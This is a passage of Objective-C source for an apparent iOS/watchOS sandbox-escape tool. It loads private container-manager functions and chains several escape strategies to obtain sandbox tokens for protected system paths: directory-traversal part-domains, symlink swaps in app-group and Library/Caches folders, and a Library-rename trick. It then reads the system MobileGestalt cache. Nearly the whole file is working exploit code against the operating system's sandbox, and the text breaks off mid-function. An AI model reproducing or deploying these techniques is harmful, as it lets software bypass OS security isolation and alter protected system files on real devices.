#import "BQCore.h"
#import "BQRecoveryValidation.h"
#import <dlfcn.h>
#import <zlib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <math.h>
#import <objc/message.h>
#import <WatchKit/WatchKit.h>

NSString * const BQErrorDomain = @"BQErrorDomain";
NSString * const BQNoSandboxTokenError = @"the MCM query returned no sandbox token — send Documents/bqtool.log";

static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
static NSString * const kPBCollections = @"com.apple.WallpaperKit.CollectionsPoster";
static NSString * const kPBCollectionsModern = @"com.apple.Posters.CollectionsPosterApp";
static NSString * const kPBMercury = @"com.apple.MercuryPoster";
static NSString * const kPBPhotos = @"com.apple.PhotosUIPrivate.PhotosPosterProvider";
static NSString * const kPBExtVersion = @"61";

// ---------------------------------------------------------------- logging ---
static NSString *gLogPath;
static NSLock *gLogLock;
static NSString *gGroupRoot;
static NSString *gGroupID;
static NSArray<NSString *> *gGroupIDs;
static NSString *gEscapeGroupRoot;
static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
static BOOL gClass2ParentEnabled;
static NSString *gClass2SubpathLink;
static dispatch_queue_t gWorkQueue;

BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }

void BQSetClass2ParentEnabled(BOOL on) {
    gClass2ParentEnabled = on;
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQClass2ParentEnabled"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"class2-parent enabled=%d", on);
}

NSString *BQLogPath(void) {
    if (!gLogPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"bqtool.log"];
    }
    return gLogPath;
}

void BQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bqtool] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = BQLogPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) [fm createFileAtPath:path contents:nil attributes:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (__unused NSException *e) {}
        [fh closeFile];
    }
    [gLogLock unlock];
}

NSString *BQDocuments(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

NSString *BQGroupID(void) {
    if (!gGroupID) {
        // Read the app's own entitlements via SecTask. This lets the exploit use
        // whatever app group the running build actually has, instead of a
        // hardcoded identifier.
        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        typedef CFTypeRef (*create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
        create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
        copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
        if (create && copy) {
            CFTypeRef task = create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (val) {
                    if (CFGetTypeID(val) == CFArrayGetTypeID()) {
                        CFArrayRef arr = (CFArrayRef)val;
                        NSMutableArray *all = [NSMutableArray array];
                        for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                            CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                            if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
                                [all addObject:[(__bridge NSString *)x copy]];
                            }
                        }
                        if (all.count) {
                            gGroupIDs = [all copy];
                            gGroupID = all.firstObject;
                        }
                    } else if (CFGetTypeID(val) == CFStringGetTypeID()) {
                        NSString *s = [(__bridge NSString *)val copy];
                        if (s.length) {
                            gGroupIDs = @[s];
                            gGroupID = s;
                        }
                    }
                    CFRelease(val);
                }
                CFRelease(task);
            }
        }
        if (!gGroupID) {
            NSString *defaultGroup = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
            if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:defaultGroup]) {
                gGroupID = defaultGroup;
                gGroupIDs = @[defaultGroup];
            } else if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.com.kamui.escape"]) {
                gGroupID = @"group.com.kamui.escape";
                gGroupIDs = @[@"group.com.kamui.escape"];
            }
        }
        BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
    }
    return gGroupID;
}

NSString *BQGroupRoot(void) {
    if (!gGroupRoot) {
        NSString *group = BQGroupID();
        if (group.length) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
            gGroupRoot = u.path;
        }
    }
    return gGroupRoot;
}

NSArray<NSString *> *BQGroupIDs(void) {
    BQGroupID();
    return gGroupIDs ?: @[];
}

dispatch_queue_t BQWorkQueue(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gWorkQueue = dispatch_queue_create("com.bqtool.work", DISPATCH_QUEUE_SERIAL);
    });
    return gWorkQueue;
}

// --------------------------------------------------------------- MCM API ---
#if __has_include(<xpc/xpc.h>)
#import <xpc/xpc.h>
#else
typedef void *xpc_object_t;
#endif
typedef xpc_object_t (*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(xpc_object_t);
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, xpc_object_t);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int (*fn_err_int)(void *);

typedef struct {
    void *h;
    fn_create create;
    fn_set_u64 set_class;
    fn_set_obj set_ids;
    fn_set_obj set_group_ids;
    fn_set_u64 set_flags;
    fn_set_u64 set_part;
    fn_set_cstr set_domain;
    fn_get_one get_one;
    fn_copy_str copy_token;
    fn_get_path get_path;
    fn_free query_free;
    fn_consume consume;
    fn_release release;
    fn_err last_error;
    fn_err_msg err_message;
    fn_err_int err_posix;
} mcm_t;

static mcm_t g;
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;

static void *bq_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static void bq_load_mcm(void) {
    if (g.create) return;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) {
        BQLog(@"dlopen MCM failed: %s", dlerror());
        return;
    }
    g.create = (fn_create)bq_sym(g.h, "container_query_create", NULL);
    g.set_class = (fn_set_u64)bq_sym(g.h, "container_query_set_class", NULL);
    g.set_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_group_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_flags = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_part = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_domain = (fn_set_cstr)bq_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (fn_get_one)bq_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (fn_copy_str)bq_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (fn_get_path)bq_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (fn_free)bq_sym(g.h, "container_query_free", NULL);
    g.consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.last_error = (fn_err)bq_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (fn_err_msg)bq_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (fn_err_int)bq_sym(g.h, "container_error_get_posix_errno", NULL);
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    BQLog(@"MCM loaded=%d create=%p get=%p token=%p consume=%p release=%p",
          g.h != NULL, g.create, g.get_one, g.copy_token, g.consume, g.release);
}

static void bq_log_query_error(void *q, NSString *where) {
    if (!q || !g.last_error) return;
    void *e = g.last_error(q);
    if (!e) return;
    int posix = g.err_posix ? g.err_posix(e) : 0;
    const char *msg = g.err_message ? g.err_message(e) : NULL;
    BQLog(@"%@: last_error posix=%d msg=%s", where, posix, msg ? msg : "(null)");
}

// ---------------------------------------------------------- fs primitives ---
static void bq_recover(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:bak]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:bak toPath:path error:&e]) {
        BQLog(@"recover %@ -> %@ failed: %@", bak, path, e);
    }
}

static BOOL bq_swap_path(NSString *path, NSString *target, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:bak error:&e]) {
            BQLog(@"swap move %@ -> %@ failed: %@", path, bak, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        BQLog(@"symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:path error:nil];
        return NO;
    }
    return YES;
}

static void bq_restore_path(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:bak]) {
        [fm removeItemAtPath:path error:nil];
        NSError *e = nil;
        if (![fm moveItemAtPath:bak toPath:path error:&e]) {
            BQLog(@"restore %@ -> %@ failed: %@", bak, path, e);
        }
    } else {
        if ([fm fileExistsAtPath:path]) {
            struct stat st;
            if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
                [fm removeItemAtPath:path error:nil];
            }
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}

// ------------------------------------------------------------------ init ---
BOOL BQCoreInit(void) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        NSString *docs = BQDocuments();
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"tendies"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"PosterBoard/Wallpapers"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
        if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
            gClass2ParentEnabled = NO;
            [defs setBool:NO forKey:@"BQClass2ParentEnabled"];
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
            BQLog(@"class2-parent disabled after a previous attempt did not finish");
        } else if (gClass2ParentEnabled) {
            [defs setBool:YES forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
        } else {
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        }
        BQLog(@"=== BQEscape start | iOS %@ | bundle %@ ===",
              [WKInterfaceDevice currentDevice].systemVersion, [[NSBundle mainBundle] bundleIdentifier]);
        bq_load_mcm();
        NSString *gid = BQGroupID();
        NSString *root = BQGroupRoot();
        BQLog(@"app group: id=%@ root=%@", gid ?: @"(none)", root ?: @"(none)");
        ok = (g.create && g.get_one && g.copy_token && g.consume && g.release);
        BQLog(@"core init ok=%d", ok);
    });
    return ok;
}

// ---------------------------------------------------------------- escape ---
static NSString *bq_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
                               uint64_t part, NSString *domain, uint64_t flags,
                               NSString *label, NSString **outPath) {
    if (!g.create || !ident.length) return -1;
    void *q = g.create();
    if (!q) return -2;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"strategy %@: cls=%llu ident=%@ part=%llu result=%p path=%@ token=%s consume=%lld",
          label, cls, ident, part, res, path ?: @"(null)", tok ? "YES" : "NO", (long long)h);
    if (!res) bq_log_query_error(q, label);
    if (tok) free(tok);
    g.query_free(q);
    if (h >= 0 && outPath) *outPath = path;
    return h;
}

// Class 2 (the app's own data container) has one more door: the sandbox
// refuses to rename the part directories themselves (Library/Caches, Documents,
// tmp, ...), but the parent Library directory can be renamed on some builds.
// Move it aside, recreate a small Library with a symlinked Caches, query class 2
// and restore the original Library immediately. The token remains valid for the
// resolved target.
// Class 2 subpath symlink: create a symlink inside the app's own
// Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
// keeps Library in place (no process-killing rename) and may make the daemon
// resolve the symlink while issuing the extension. Safe to attempt: only a
// temporary symlink inside Caches is touched.
static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    if (!g.set_domain) return -1;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *leaf = [NSString stringWithFormat:@".bq_link_%d", getpid()];
    NSString *link = [caches stringByAppendingPathComponent:leaf];
    unlink(link.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        BQLog(@"class2-subpath: symlink failed errno=%d (%s)", errno, strerror(errno));
        return -2;
    }

    NSArray *domains = @[
        leaf,
        [@"Caches/" stringByAppendingString:leaf],
        [@"Library/Caches/" stringByAppendingString:leaf],
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-subpath-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            // A token for the symlink path is not enough: the editor needs the
            // resolved target. Verify before reporting success.
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-subpath: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 subpath (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    return last;
}

// Class 2 staged symlink: put a tiny fake tree inside the app's own
// Library/Caches, then use partDomain so MCM appends "Library/Caches" behind a
// symlink that resolves to the target. No Library move and no app group.
static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length || !g.set_domain) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *tag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
    NSString *stage = [caches stringByAppendingPathComponent:tag];
    NSString *link = [caches stringByAppendingPathComponent:
                      [NSString stringWithFormat:@".bq_slink_%d", getpid()]];
    NSString *stageLib = [stage stringByAppendingPathComponent:@"Library"];
    NSString *stageCaches = [stageLib stringByAppendingPathComponent:@"Caches"];

    [fm removeItemAtPath:stage error:nil];
    unlink(link.fileSystemRepresentation);
    if (![fm createDirectoryAtPath:stageLib withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }
    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        unlink(stageCaches.fileSystemRepresentation);
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSArray *domains = @[
        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
        [@"Caches/" stringByAppendingString:link.lastPathComponent],
        link.lastPathComponent,
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-stage-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-stage: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            unlink(stageCaches.fileSystemRepresentation);
            rmdir(stageLib.fileSystemRepresentation);
            rmdir(stage.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 stage (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    unlink(stageCaches.fileSystemRepresentation);
    rmdir(stageLib.fileSystemRepresentation);
    rmdir(stage.fileSystemRepresentation);
    return last;
}

static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];

    // Recover an interrupted attempt. A stale backup is only safe to restore
    // when the live Library is missing or is our temporary Caches symlink.
    if ([fm fileExistsAtPath:bak]) {
        struct stat st;
        BOOL temp = ([fm fileExistsAtPath:lib] &&
                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
                     S_ISLNK(st.st_mode));
        if (temp || ![fm fileExistsAtPath:lib]) {
            bq_restore_path(lib, bak);
        } else {
            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
            return -2;
        }
    }
    if (![fm fileExistsAtPath:lib]) return -2;

    NSError *e = nil;
    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
        return -2;
    }
    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
        BQLog(@"class2-parent: recreate Library failed: %@", e);
        [fm moveItemAtPath:bak toPath:lib error:nil];
        return -2;
    }
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
        bq_restore_path(lib, bak);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
                                @"class2-parent", &path);
    // Restore the real Library before returning. Remove the symlink first so a
    // recursive directory removal can never walk into the target.
    unlink(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    NSError *re = nil;
    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
        BQLog(@"class2-parent: restore Library failed: %@", re);
        bq_restore_path(lib, bak);
    }
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-parent: token did not open target");
            if (g.release) g.release(h);
            return -5;
        }
        closedir(d);
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 parent -> %@", target);
        return h;
    }
    return h;
}

static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
    NSArray<NSString *> *ids = BQGroupIDs();
    if (!ids.count) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    int64_t last = -6;
    for (NSString *gid in ids) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        NSString *groot = u.path;
        if (!groot.length) continue;
        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
        bq_recover(caches, bak);
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
        }
        if (!bq_swap_path(caches, target, bak)) {
            bq_restore_path(caches, bak);
            last = -2;
            continue;
        }
        NSString *path = nil;
        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
                                    [@"class7-symlink/" stringByAppendingString:gid], &path);
        if (h >= 0) {
            gEscapeGroupRoot = groot;
            if (linkOut) *linkOut = caches;
            return h;
        }
        bq_restore_path(caches, bak);
        last = h;
    }
    return last;
}

int64_t BQEscape(NSString *target, NSString **linkOut) {
    if (!target.length) return -1;
    bq_load_mcm();
    int64_t last = -1;

    // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
    //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
    if (gTraversalState >= 0 && target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
                                    @"class13-traversal", &p);
        if (h >= 0) {
            gTraversalState = 1;
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 traversal -> %@", p ?: target);
            return h;
        }
        gTraversalState = -1;
        last = h;
    }

    // 2. App-group part-directory symlink (27.2).
    NSString *gid = BQGroupID();
    if (gid.length) {
        NSString *link = nil;
        int64_t h = bq_escape_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link;
            BQLog(@"escape: using class7 symlink");
            return h;
        }
        last = h;
    }

    // 3. Class 2 staged symlink: a fake Library/Caches tree inside the app's
    //    Caches, resolved through a partDomain symlink. Safe and no app group.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_stage(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 stage");
            return h;
        }
        last = h;
    }

    // 4. Class 2 symlink inside the existing Library/Caches. This is safe and
    //    needs no app group; it only works if MCM follows a relative symlink in
    //    partDomain without rejecting the resolved target.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_subpath(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 subpath");
            return h;
        }
        last = h;
    }

    // 5. Class 2 parent-directory symlink. No app group needed: move the app's
    //    Library aside, create Library/Caches -> target, query the app's own
    //    container (class 2), then restore Library. Off by default: some builds
    //    kill the process for moving Library, so this is opt-in from Settings.
    if (gClass2ParentEnabled) {
        NSString *link = nil;
        int64_t h = bq_escape_class2_parent(target, &link);
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 parent");
            return h;
        }
        last = h;
    } else {
        BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
    }

    // 6. Class 13 direct MobileGestalt query (some 27.0.x builds).
    if ([target isEqualToString:kMGCaches]) {
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
                                    @"class13-direct", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 direct");
            return h;
        }
        last = h;
    }

    // 7. Class 12 geod part-domain traversal (older builds).
    if (target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
                                    @"class12-geod-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class12 geod traversal");
            return h;
        }
        last = h;
    }

    BQLog(@"escape: all strategies failed (last=%lld) target=%@", (long long)last, target);
    return last;
}

static NSString *bq_escape_error(int64_t h) {
    if (h == -6) {
        return NSLocalizedString(@"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry", nil);
    }
    if (h == -2) {
        return NSLocalizedString(@"class-2 fallback could not move Library — this build needs an app group on 27.2", nil);
    }
    if (h == -5) {
        return BQNoSandboxTokenError;
    }
    return [NSString stringWithFormat:NSLocalizedString(@"escape failed (%lld)", nil), (long long)h];
}

void BQEndEscape(int64_t handle) {
    if (handle >= 0 && g.release) g.release(handle);
    if (gClass2SubpathLink.length) {
        unlink(gClass2SubpathLink.fileSystemRepresentation);
        gClass2SubpathLink = nil;
    }
    NSString *groot = gEscapeGroupRoot;
    gEscapeGroupRoot = nil;
    if (!groot.length) return;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    bq_restore_path(caches, bak);
}
// -------------------------------------------------------------- Gestalt ---
NSString *BQBackupPath(void) {
    return [BQDocuments() stringByAppendingPathComponent:@"OriginalGestalt.plist"];
}

BOOL BQBackupExists(void) {
    NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:BQBackupPath()];
    return [plist[@"CacheExtra"] isKindOfClass:[NSDictionary class]] &&
           [plist[@"CacheData"] isKindOfClass:[NSData class]];
}

static NSString *bq_backups_directory(void) {
    return [BQDocuments() stringByAppendingPathComponent:@"MGBackups"];
}

static BOOL bq_valid_gestalt_data(NSData *data) {
    if (!data.length) return NO;
    NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:data options:0 format:NULL error:NULL];
    return [plist isKindOfClass:[NSDictionary class]] &&
           [plist[@"CacheExtra"] isKindOfClass:[NSDictionary class]] &&
           [plist[@"CacheData"] isKindOfClass:[NSData class]];
}

static NSString *bq_create_gestalt_backup(NSString *kind, NSString **err) {
    BOOL initial = [kind isEqualToString:@"initial"];
    if (initial && [[NSFileManager defaultManager] fileExistsAtPath:BQBackupPath()]) {
        if (err) *err = @"An initial backup already exists and will not be overwritten.";
        return nil;
    }
    if ([kind isEqualToString:@"manual"] && !BQBackupExists()) {
        if (err) *err = @"Create the initial backup first.";
        return nil;
    }
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return nil;
    }
    NSData *data = [NSData dataWithContentsOfFile:[link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"]];
    BQEndEscape(h);
    if (!bq_valid_gestalt_data(data)) {
        if (err) *err = @"MobileGestalt plist is missing or invalid.";
        return nil;
    }
    NSString *identifier = initial ? @"initial" : [NSString stringWithFormat:@"%@-%@", kind, [NSUUID UUID].UUIDString];
    NSString *path;
    if (initial) {
        path = BQBackupPath();
    } else {
        NSError *directoryError = nil;
        [[NSFileManager defaultManager] createDirectoryAtPath:bq_backups_directory()
                                  withIntermediateDirectories:YES attributes:nil error:&directoryError];
        if (directoryError) {
            if (err) *err = directoryError.localizedDescription;
            return nil;
        }
